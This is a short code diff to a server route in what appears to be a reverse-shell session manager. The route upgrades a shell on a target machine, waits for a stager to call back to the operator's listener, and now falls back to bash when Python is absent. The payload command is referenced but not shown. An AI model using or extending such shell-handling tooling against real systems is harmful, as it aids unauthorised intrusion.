@@ -130,15 +130,17 @@ def register_sessions_routes(app: FastAPI, ctx) -> None:
         # detection echoes back fast on a live shell; the long tail is only a dead/hung shell
         out = await sess.run_and_capture(upgrade_command(lhost, port, token).encode(), timeout=6.0)
         cb = f"{lhost}:{port}"
-        if b"RECCE_NO_PYTHON" in out:
+        if b"RECCE_NO_METHOD" in out:
             return {"ok": True, "upgraded": False, "callback": cb,
-                    "reason": "no python/base64 on the target — use a manual payload from the catalog"}
-        # wait for the stager to actually call back (a new PTY session carrying our token)
+                    "reason": "no python or bash on the target — use a manual payload from the catalog"}
+        # wait for the upgraded shell to call back (a new session carrying our token — PTY
+        # via python, or a reconnecting non-PTY shell via the bash fallback)
         for _ in range(20):                      # ~10s
             new = next((s for s in mgr.sessions.values()
-                        if s.token == token and s.pty and s.status == "live"), None)
+                        if s.token == token and s.status == "live"), None)
             if new:
-                return {"ok": True, "upgraded": True, "session_id": new.id, "callback": cb}
+                return {"ok": True, "upgraded": True, "session_id": new.id,
+                        "pty": new.pty, "callback": cb}
             await asyncio.sleep(0.5)
         return {"ok": True, "upgraded": False, "callback": cb,
                 "reason": f"stager launched but didn't call back — egress to {cb} may be blocked"}
